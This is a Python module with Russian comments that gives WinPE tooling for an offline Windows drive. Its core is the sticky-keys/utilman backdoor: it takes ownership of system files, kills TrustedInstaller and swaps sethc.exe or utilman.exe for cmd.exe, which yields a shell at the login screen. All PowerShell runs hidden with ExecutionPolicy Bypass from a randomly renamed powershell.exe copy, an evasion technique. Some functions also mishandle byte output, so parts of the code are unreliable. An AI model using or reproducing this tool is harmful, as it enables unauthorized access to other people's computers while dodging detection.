"""
Инструменты для работы из среды WinPE (Windows Preinstallation Environment)

Проблема: В WinPE буква системного диска может отличаться от C:
Решение: Автоматическое определение буквы диска Windows и работа с офлайн-файлами
"""

import subprocess
import os
import logging

# Константа для скрытия окна консоли
CREATE_NO_WINDOW = 0x08000000

logger = logging.getLogger(__name__)


def generate_random_name(length: int = 8) -> str:
    """Сгенерировать случайное имя для процесса"""
    import random
    import string
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))


def run_hidden_command(cmd: str, capture_output: bool = False) -> subprocess.CompletedProcess:
    """Выполнить команду без показа окна консоли"""
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE

    return subprocess.run(
        cmd,
        shell=True,
        capture_output=capture_output,
        startupinfo=startupinfo,
        creationflags=CREATE_NO_WINDOW
    )


def run_hidden_powershell(ps_command: str, capture_output: bool = True, random_name: bool = True) -> subprocess.CompletedProcess:
    """
    Выполнить PowerShell команду без показа окна
    
    Args:
        ps_command: Команда PowerShell для выполнения
        capture_output: Захватывать ли вывод
        random_name: Запускать ли с случайным именем процесса
    """
    import tempfile
    import shutil
    
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    
    if random_name:
        # Создаём копию powershell.exe со случайным именем
        temp_dir = tempfile.mkdtemp(prefix='PS_')
        ps_exe = os.path.join(os.environ.get('SystemRoot', r'C:\Windows'), 'System32\\WindowsPowerShell\\v1.0\\powershell.exe')
        random_name_file = generate_random_name(12) + '.exe'
        ps_copy = os.path.join(temp_dir, random_name_file)
        
        try:
            shutil.copy2(ps_exe, ps_copy)
        except Exception as e:
            logger.error(f"Не удалось создать копию PowerShell: {e}")
            ps_copy = ps_exe
        
        return subprocess.run(
            [ps_copy, '-ExecutionPolicy', 'Bypass', '-Command', ps_command],
            capture_output=capture_output,
            startupinfo=startupinfo,
            creationflags=CREATE_NO_WINDOW
        )
    else:
        return subprocess.run(
            ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_command],
            capture_output=capture_output,
            startupinfo=startupinfo,
            creationflags=CREATE_NO_WINDOW
        )


def decode_output(stdout_bytes: bytes) -> str:
    """
    Декодировать вывод команды с обработкой ошибок кодировки
    
    Args:
        stdout_bytes: Байты вывода команды
        
    Returns:
        str: Декодированная строка
    """
    if not stdout_bytes:
        return ""
    
    # Пробуем UTF-8, затем cp1251 (кириллица Windows), затем с заменой ошибок
    for encoding in ['utf-8', 'cp1251', 'cp866']:
        try:
            return stdout_bytes.decode(encoding)
        except UnicodeDecodeError:
            continue
    
    # Если ничего не подошло, декодируем с заменой некорректных символов
    return stdout_bytes.decode('utf-8', errors='replace')


def get_windows_drive_letter() -> str:
    r"""
    Определить букву диска с установленной Windows

    В WinPE системный диск может иметь букву D:, E:, F: и т.д.
    Ищем диск, на котором есть папка \Windows\System32

    Returns:
        str: Буква диска (например, 'D:') или None если не найден
    """
    # Получаем список всех логических дисков с подробной информацией
    ps_script = r'''
    $drives = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | 
              Select-Object DeviceID, Size, FreeSpace, VolumeName
    foreach ($drive in $drives) {
        # Правильное построение пути с обратным слэшем после буквы диска
        $system32Path = "$($drive.DeviceID)\Windows\System32"
        if (Test-Path $system32Path) {
            Write-Output "FOUND:$($drive.DeviceID)"
            break
        }
    }
    
    # Если не найдено, выводим список всех дисков для отладки
    $drives = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3"
    foreach ($drive in $drives) {
        $path = "$($drive.DeviceID)\Windows\System32"
        Write-Output "CHECK:$($drive.DeviceID) -> $path"
    }
    '''

    try:
        result = run_hidden_powershell(ps_script, capture_output=True)
        output = decode_output(result.stdout) if result.stdout else ""
        logger.info(f"PowerShell вывод: {output}")

        # Ищем строку FOUND:
        for line in output.strip().split('\n'):
            if line.startswith('FOUND:'):
                drive_letter = line.replace('FOUND:', '').strip()
                logger.info(f"Найден диск Windows: {drive_letter}")
                return drive_letter

        # Если не найдено через PowerShell, пробуем перебором
        logger.info("PowerShell не нашёл диск, пробуем перебор...")
    except Exception as e:
        logger.error(f"Ошибка определения диска через PowerShell: {e}")

    # Если PowerShell не сработал, пробуем перебором (расширенный диапазон)
    all_letters = [f'{chr(i)}:' for i in range(ord('C'), ord('Z') + 1)]
    for letter in all_letters:
        # Пробуем оба варианта пути (с разными слэшами)
        system32_path_backslash = f"{letter}\\Windows\\System32"
        system32_path_forward = f"{letter}/Windows/System32"
        
        if os.path.exists(system32_path_backslash):
            logger.info(f"Найден диск Windows (перебор, backslash): {letter}")
            return letter
        if os.path.exists(system32_path_forward):
            logger.info(f"Найден диск Windows (перебор, forward): {letter}")
            return letter

    logger.warning("Диск Windows не найден ни одним из методов")
    return None


def get_system32_path() -> str:
    """
    Получить полный путь к System32 на диске Windows
    
    Returns:
        str: Путь к System32 или None если диск не найден
    """
    drive_letter = get_windows_drive_letter()
    if drive_letter:
        return f"{drive_letter}\\Windows\\System32"
    return None


def take_ownership_winpe(filepath: str) -> bool:
    """
    Взять файл в собственность в среде WinPE
    
    Args:
        filepath: Полный путь к файлу
        
    Returns:
        bool: True если успешно
    """
    try:
        ps_script = f'''
        $ErrorActionPreference = "Stop"
        $file = "{filepath}"
        
        if (-not (Test-Path $file)) {{
            Write-Error "Файл не найден: $file"
            exit 1
        }}
        
        # Останавливаем TrustedInstaller если запущен
        try {{
            $ti = Get-Process TrustedInstaller -ErrorAction SilentlyContinue
            if ($ti) {{ Stop-Process $ti -Force }}
        }} catch {{}}
        
        # Получаем текущие права
        $acl = Get-Acl $file
        
        # Берём ownership на Administrators
        $adminAccount = New-Object System.Security.Principal.NTAccount("Administrators")
        $acl.SetOwner($adminAccount)
        Set-Acl $file -AclObject $acl
        
        # Даём полные права Administrators
        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
            $adminAccount,
            "FullControl",
            "Allow"
        )
        $acl.ResetAccessRule($rule)
        Set-Acl $file -AclObject $acl
        
        # Снимаем все атрибуты
        [System.IO.File]::SetAttributes($file, "Normal")
        '''
        
        result = run_hidden_powershell(ps_script)
        return result.returncode == 0
    except Exception as e:
        logger.error(f"Ошибка взятия ownership: {e}")
        return False


def replace_file_winpe(source_file: str, target_file: str, backup_name: str = None) -> bool:
    """
    Заменить системный файл в среде WinPE

    Args:
        source_file: Путь к файлу-источнику (например, cmd.exe или custom exe)
        target_file: Путь к файлу для замены (например, sethc.exe)
        backup_name: Имя для резервной копии (по умолчанию добавляет .bak)

    Returns:
        bool: True если успешно
    """
    try:
        # Проверяем существование файлов ДО PowerShell
        if not os.path.exists(source_file):
            logger.error(f"Файл-источник не найден: {source_file}")
            return False
        
        if not os.path.exists(target_file) and not os.path.exists(target_file + '.bak'):
            # Файл может быть уже заменён и переименован в .bak
            logger.warning(f"Целевой файл не найден: {target_file}")

        if backup_name is None:
            backup_name = os.path.basename(target_file) + '.bak'

        logger.info(f"replace_file_winpe: source={source_file}, target={target_file}, backup={backup_name}")

        # Берём ownership
        take_ownership_winpe(target_file)

        # Экранируем обратные слеши для PowerShell
        source_escaped = source_file.replace('\\', '\\\\')
        dest_escaped = target_file.replace('\\', '\\\\')
        backup_escaped = backup_name.replace('\\', '\\\\')

        ps_script = f'''
        $ErrorActionPreference = "Stop"
        $source = "{source_file}"
        $dest = "{target_file}"
        $backup = "{backup_name}"

        Write-Output "Source: $source"
        Write-Output "Dest: $dest"
        Write-Output "Backup: $backup"

        # Проверяем существование источника
        if (-not (Test-Path $source)) {{
            Write-Error "Источник не найден: $source"
            exit 1
        }}

        Write-Output "Source exists: $(Test-Path $source)"
        Write-Output "Dest exists before: $(Test-Path $dest)"

        # Переименовываем оригинал в .bak
        if (Test-Path $dest) {{
            Rename-Item -Path $dest -NewName $backup -Force
            Write-Output "Original renamed to: $backup"
        }}

        # Копируем новый файл
        Copy-Item $source $dest -Force
        Write-Output "Copy completed"

        # Проверяем успешность
        if (Test-Path $dest) {{
            Write-Output "Файл успешно заменён"
            exit 0
        }} else {{
            Write-Error "Не удалось скопировать файл"
            exit 1
        }}
        '''

        result = run_hidden_powershell(ps_script, capture_output=True)
        logger.info(f"PowerShell stdout: {result.stdout}")
        logger.info(f"PowerShell stderr: {result.stderr}")
        logger.info(f"PowerShell returncode: {result.returncode}")
        
        return result.returncode == 0
    except Exception as e:
        logger.error(f"Ошибка замены файла: {e}")
        return False


def replace_sethc_winpe(source_exe: str = None) -> dict:
    """
    Заменить sethc.exe (залипание клавиш) на cmd.exe или другой файл

    Классический метод получения доступа к системе через 5 нажатий Shift

    Args:
        source_exe: Путь к файлу для замены (по умолчанию cmd.exe)

    Returns:
        dict: Результат операции
    """
    result = {
        'success': False,
        'message': '',
        'drive_letter': None,
        'system32_path': None
    }

    # Определяем букву диска
    drive_letter = get_windows_drive_letter()
    if not drive_letter:
        result['message'] = 'Не удалось определить букву диска Windows'
        return result

    result['drive_letter'] = drive_letter

    # Строим путь к System32 корректно
    system32_path = f"{drive_letter}\\Windows\\System32"
    if not os.path.exists(system32_path):
        result['message'] = f'Папка System32 не найдена по пути: {system32_path}'
        return result

    result['system32_path'] = system32_path

    # Если не указан источник, используем cmd.exe с того же диска
    if source_exe is None:
        source_exe = f"{drive_letter}\\Windows\\System32\\cmd.exe"
    
    # Проверяем существование источника
    if not os.path.exists(source_exe):
        result['message'] = f'Файл-источник не найден: {source_exe}'
        return result

    sethc_path = f"{system32_path}\\sethc.exe"

    logger.info(f"Замена sethc.exe: {sethc_path} -> {source_exe}")
    logger.info(f"Проверка путей: system32={os.path.exists(system32_path)}, source={os.path.exists(source_exe)}")

    if replace_file_winpe(source_exe, sethc_path, 'sethc.exe.bak'):
        result['success'] = True
        result['message'] = f'sethc.exe успешно заменён на {source_exe}\nДиск: {drive_letter}'
    else:
        result['message'] = 'Ошибка замены файла (см. лог)'

    return result


def replace_utilman_winpe(source_exe: str = None) -> dict:
    """
    Заменить utilman.exe (специальные возможности) на cmd.exe или другой файл

    Альтернативный метод получения доступа через Win+U на экране входа

    Args:
        source_exe: Путь к файлу для замены (по умолчанию cmd.exe)

    Returns:
        dict: Результат операции
    """
    result = {
        'success': False,
        'message': '',
        'drive_letter': None,
        'system32_path': None
    }

    # Определяем букву диска
    drive_letter = get_windows_drive_letter()
    if not drive_letter:
        result['message'] = 'Не удалось определить букву диска Windows'
        return result

    result['drive_letter'] = drive_letter

    # Строим путь к System32 корректно
    system32_path = f"{drive_letter}\\Windows\\System32"
    if not os.path.exists(system32_path):
        result['message'] = f'Папка System32 не найдена по пути: {system32_path}'
        return result

    result['system32_path'] = system32_path

    # Если не указан источник, используем cmd.exe с того же диска
    if source_exe is None:
        source_exe = f"{drive_letter}\\Windows\\System32\\cmd.exe"
    
    # Проверяем существование источника
    if not os.path.exists(source_exe):
        result['message'] = f'Файл-источник не найден: {source_exe}'
        return result

    utilman_path = f"{system32_path}\\utilman.exe"

    logger.info(f"Замена utilman.exe: {utilman_path} -> {source_exe}")
    logger.info(f"Проверка путей: system32={os.path.exists(system32_path)}, source={os.path.exists(source_exe)}")

    if replace_file_winpe(source_exe, utilman_path, 'utilman.exe.bak'):
        result['success'] = True
        result['message'] = f'utilman.exe успешно заменён на {source_exe}\nДиск: {drive_letter}'
    else:
        result['message'] = 'Ошибка замены файла (см. лог)'

    return result


def restore_sethc_winpe(modules_dir: str = None) -> dict:
    """
    Восстановить оригинальный sethc.exe из резервной копии или modules

    Args:
        modules_dir: Путь к папке modules с резервным sethc.exe

    Returns:
        dict: Результат операции
    """
    result = {
        'success': False,
        'message': '',
        'drive_letter': None,
        'system32_path': None
    }

    # Определяем букву диска
    drive_letter = get_windows_drive_letter()
    if not drive_letter:
        result['message'] = 'Не удалось определить букву диска Windows'
        return result

    result['drive_letter'] = drive_letter

    # Строим путь к System32 корректно
    system32_path = f"{drive_letter}\\Windows\\System32"
    if not os.path.exists(system32_path):
        result['message'] = f'Папка System32 не найдена по пути: {system32_path}'
        return result

    result['system32_path'] = system32_path

    sethc_path = f"{system32_path}\\sethc.exe"
    backup_path = f"{sethc_path}.bak"

    logger.info(f"Восстановление sethc.exe: {sethc_path}")
    logger.info(f"Backup path: {backup_path}, exists: {os.path.exists(backup_path)}")

    # Сначала пробуем восстановить из .bak
    if os.path.exists(backup_path):
        logger.info(f"Восстановление sethc.exe из {backup_path}")
        if replace_file_winpe(backup_path, sethc_path, None):
            result['success'] = True
            result['message'] = 'sethc.exe восстановлён из резервной копии'
            return result

    # Если .bak нет, пробуем modules
    if modules_dir and os.path.exists(modules_dir):
        source_sethc = f"{modules_dir}\\sethc.exe"
        if os.path.exists(source_sethc):
            logger.info(f"Восстановление sethc.exe из {source_sethc}")
            if replace_file_winpe(source_sethc, sethc_path, None):
                result['success'] = True
                result['message'] = f'sethc.exe восстановлён из {source_sethc}'
                return result
        else:
            logger.warning(f"Файл {source_sethc} не найден")

    result['message'] = 'Резервная копия sethc.exe не найдена'
    return result


def restore_utilman_winpe(modules_dir: str = None) -> dict:
    """
    Восстановить оригинальный utilman.exe из резервной копии или modules

    Args:
        modules_dir: Путь к папке modules с резервным utilman.exe

    Returns:
        dict: Результат операции
    """
    result = {
        'success': False,
        'message': '',
        'drive_letter': None,
        'system32_path': None
    }

    # Определяем букву диска
    drive_letter = get_windows_drive_letter()
    if not drive_letter:
        result['message'] = 'Не удалось определить букву диска Windows'
        return result

    result['drive_letter'] = drive_letter

    # Строим путь к System32 корректно
    system32_path = f"{drive_letter}\\Windows\\System32"
    if not os.path.exists(system32_path):
        result['message'] = f'Папка System32 не найдена по пути: {system32_path}'
        return result

    result['system32_path'] = system32_path

    utilman_path = f"{system32_path}\\utilman.exe"
    backup_path = f"{utilman_path}.bak"

    logger.info(f"Восстановление utilman.exe: {utilman_path}")
    logger.info(f"Backup path: {backup_path}, exists: {os.path.exists(backup_path)}")

    # Сначала пробуем восстановить из .bak
    if os.path.exists(backup_path):
        logger.info(f"Восстановление utilman.exe из {backup_path}")
        if replace_file_winpe(backup_path, utilman_path, None):
            result['success'] = True
            result['message'] = 'utilman.exe восстановлён из резервной копии'
            return result

    # Если .bak нет, пробуем modules
    if modules_dir and os.path.exists(modules_dir):
        source_utilman = f"{modules_dir}\\Utilman.exe"
        if os.path.exists(source_utilman):
            logger.info(f"Восстановление utilman.exe из {source_utilman}")
            if replace_file_winpe(source_utilman, utilman_path, None):
                result['success'] = True
                result['message'] = f'utilman.exe восстановлён из {source_utilman}'
                return result
        else:
            logger.warning(f"Файл {source_utilman} не найден")

    result['message'] = 'Резервная копия utilman.exe не найдена'
    return result


def check_bitlocker_status(drive_letter: str = None) -> dict:
    """
    Проверить статус шифрования BitLocker на диске
    
    Args:
        drive_letter: Буква диска (по умолчанию определяется автоматически)
        
    Returns:
        dict: Статус BitLocker
    """
    result = {
        'encrypted': False,
        'locked': False,
        'message': ''
    }
    
    if drive_letter is None:
        drive_letter = get_windows_drive_letter()
    
    if not drive_letter:
        result['message'] = 'Не удалось определить букву диска'
        return result
    
    try:
        ps_script = f'''
        $drive = "{drive_letter}"
        $bl = Get-BitLockerVolume -MountPoint $drive -ErrorAction SilentlyContinue
        if ($bl) {{
            Write-Output "Status:$($bl.VolumeStatus)"
            Write-Output "Protection:$($bl.ProtectionStatus)"
        }} else {{
            Write-Output "Status:NotEnabled"
        }}
        '''
        
        output = run_hidden_powershell(ps_script, capture_output=True)
        if output.stdout:
            if 'Status:Locked' in output.stdout:
                result['encrypted'] = True
                result['locked'] = True
                result['message'] = f'Диск {drive_letter} зашифрован BitLocker и заблокирован'
            elif 'Status:FullyDecrypted' in output.stdout or 'Status:Unlocked' in output.stdout:
                result['encrypted'] = False
                result['message'] = f'Диск {drive_letter} не зашифрован или разблокирован'
            else:
                result['message'] = f'BitLocker не включён на {drive_letter}'
    except Exception as e:
        logger.error(f"Ошибка проверки BitLocker: {e}")
        result['message'] = f'Ошибка проверки BitLocker: {e}'
    
    return result


def unlock_bitlocker(drive_letter: str = None, password: str = None, recovery_key: str = None) -> bool:
    """
    Разблокировать диск зашифрованный BitLocker
    
    Args:
        drive_letter: Буква диска
        password: Пароль для разблокировки
        recovery_key: Путь к файлу с ключом восстановления
        
    Returns:
        bool: True если успешно
    """
    if drive_letter is None:
        drive_letter = get_windows_drive_letter()
    
    if not drive_letter:
        return False
    
    try:
        if password:
            ps_script = f'''
            $SecurePassword = ConvertTo-SecureString "{password}" -AsPlainText -Force
            Unlock-BitLocker -MountPoint "{drive_letter}" -Password $SecurePassword
            '''
            result = run_hidden_powershell(ps_script)
            return result.returncode == 0
        elif recovery_key:
            ps_script = f'''
            Unlock-BitLocker -MountPoint "{drive_letter}" -RecoveryPassword "{recovery_key}"
            '''
            result = run_hidden_powershell(ps_script)
            return result.returncode == 0
    except Exception as e:
        logger.error(f"Ошибка разблокировки BitLocker: {e}")
    
    return False


def list_volumes() -> list:
    """
    Получить список всех томов с информацией
    
    Returns:
        list: Список словарей с информацией о томах
    """
    volumes = []
    
    try:
        ps_script = '''
        Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | 
        Select-Object DeviceID, Size, FreeSpace, VolumeName | 
        ForEach-Object {
            $sizeGB = [math]::Round($_.Size / 1GB, 2)
            $freeGB = [math]::Round($_.FreeSpace / 1GB, 2)
            Write-Output "$($_.DeviceID)|$sizeGB|$freeGB|$($_.VolumeName)"
        }
        '''
        
        output = run_hidden_powershell(ps_script, capture_output=True)
        for line in output.stdout.strip().split('\n'):
            if line and '|' in line:
                parts = line.split('|')
                if len(parts) >= 4:
                    volumes.append({
                        'drive': parts[0],
                        'size_gb': parts[1],
                        'free_gb': parts[2],
                        'label': parts[3]
                    })
    except Exception as e:
        logger.error(f"Ошибка получения списка томов: {e}")
    
    return volumes
